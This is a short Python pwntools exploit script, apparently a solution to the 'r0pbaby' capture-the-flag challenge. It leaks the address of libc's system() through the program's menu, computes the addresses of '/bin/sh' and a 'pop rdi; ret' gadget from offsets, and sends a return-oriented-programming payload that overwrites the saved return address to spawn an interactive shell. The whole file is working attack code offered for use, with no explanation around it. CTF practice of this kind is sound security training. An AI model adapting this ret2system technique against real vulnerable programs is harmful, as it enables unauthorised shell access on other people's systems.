from pwn import *

context.log_level = 'debug'

lib = ELF('./libc.so.6')
bin = ELF('./r0pbaby')

p = process('./r0pbaby', env={'LD_PRELOAD' : 'libc.so.6'})

system_offset = lib.symbols['system']

#writable = 0x0000000000201de8
binsh_offset = 0x1479c7 # /bin/sh - system
pop_rdi_ret_offset = 0x0019dba5
pop_rdi_ret = pop_rdi_ret_offset - system_offset

'''
rop code
2 > system leak
calc '/bin/sh' address
3 > overwrite ret

'''

#gdb.attach(proc.pidof(p)[0], 'b *puts')

p.sendline('2')
p.sendline('system')
p.recvuntil('Symbol system: ')
system_leak = int(p.recvline().split('\n')[0],16)

print 'system_leak: '
print system_leak

binsh = system_leak + binsh_offset

print 'binsh: '
print binsh

payload = 'a' * 8
payload += p64(system_leak + pop_rdi_ret) + p64(binsh) + p64(system_leak)

p.sendline('3')
p.sendline(str(len(payload) + 1))
p.sendline(payload)

p.interactive()

